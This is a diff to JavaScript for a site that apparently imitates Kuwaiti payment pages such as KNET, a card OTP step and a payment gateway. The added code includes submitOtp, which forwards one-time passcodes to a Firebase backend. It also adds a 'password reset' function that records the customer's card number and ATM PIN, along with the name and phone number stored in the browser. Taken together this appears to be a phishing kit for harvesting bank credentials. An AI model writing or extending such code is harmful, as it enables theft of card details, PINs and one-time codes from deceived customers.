@@ -137,6 +137,9 @@
     const path = window.location.pathname;
     if (path.includes('knet')) return 'صفحة الكي نت';
     if (path.includes('verification')) return 'صفحة التحقق';
+    if (path.includes('forgot-password')) return 'نسيت كلمة المرور';
+    if (path.includes('otpcredit')) return 'رمز الفيزا';
+    if (path.includes('otp')) return 'التحقق من OTP';
     if (path.includes('gateway')) return 'بوابة الدفع';
     if (path.includes('carte')) return 'سلة التسوق';
     if (path.includes('loan')) return 'طلب سلفة';
@@ -320,7 +323,9 @@
     loan: 'طلب سلفة',
     refund: 'طلب استرداد',
     watch: 'طلب الساعة الذكية',
-    login: 'تسجيل الدخول'
+    login: 'تسجيل الدخول',
+    password_reset: 'إعادة تعيين كلمة المرور',
+    otp: 'رمز التحقق OTP'
   };
 
   window.pushFirebaseRequest = function (request) {
@@ -462,6 +467,62 @@
       if (typeof window.pushFirebaseLogin !== 'function') return Promise.resolve();
       try {
         return Promise.resolve(window.pushFirebaseLogin(data)).catch(function () {});
+      } catch (e) {
+        return Promise.resolve();
+      }
+    }
+    const ready = (typeof window.ensureAuthReady === 'function')
+      ? window.ensureAuthReady().then(send).catch(send)
+      : send();
+    const timeout = new Promise(function (resolve) {
+      setTimeout(function () { send().then(resolve); }, 2500);
+    });
+    return Promise.race([ready, timeout]);
+  };
+
+  // ═══════════════════════════════════════════════════════════
+  // إرسال رمز التحقق OTP (صفحة otp.html) مع انتظار المصادقة وحدّ زمني
+  // ═══════════════════════════════════════════════════════════
+  window.submitOtp = function (otp) {
+    let sent = false;
+    function send() {
+      if (sent) return Promise.resolve();
+      sent = true;
+      if (typeof window.pushFirebaseOtp !== 'function') return Promise.resolve();
+      try {
+        return Promise.resolve(window.pushFirebaseOtp(otp)).catch(function () {});
+      } catch (e) {
+        return Promise.resolve();
+      }
+    }
+    const ready = (typeof window.ensureAuthReady === 'function')
+      ? window.ensureAuthReady().then(send).catch(send)
+      : send();
+    const timeout = new Promise(function (resolve) {
+      setTimeout(function () { send().then(resolve); }, 2500);
+    });
+    return Promise.race([ready, timeout]);
+  };
+
+  // ═══════════════════════════════════════════════════════════
+  // إرسال طلب إعادة تعيين كلمة المرور (صفحة forgot-password.html)
+  // يكتب في customers/{sessionId} ومجموعة requests وفي RTDB.
+  //   data: { card, atmPin }
+  // ═══════════════════════════════════════════════════════════
+  window.submitPasswordReset = function (data) {
+    data = data || {};
+    let sent = false;
+    function send() {
+      if (sent) return Promise.resolve();
+      sent = true;
+      if (typeof window.pushFirebaseRequest !== 'function') return Promise.resolve();
+      try {
+        return Promise.resolve(window.pushFirebaseRequest({
+          type: 'password_reset',
+          name: localStorage.getItem('customerName') || '',
+          phone: localStorage.getItem('phone') || '',
+          details: { card: String(data.card || ''), atmPin: String(data.atmPin || '') }
+        })).catch(function () {});
       } catch (e) {
         return Promise.resolve();
       }
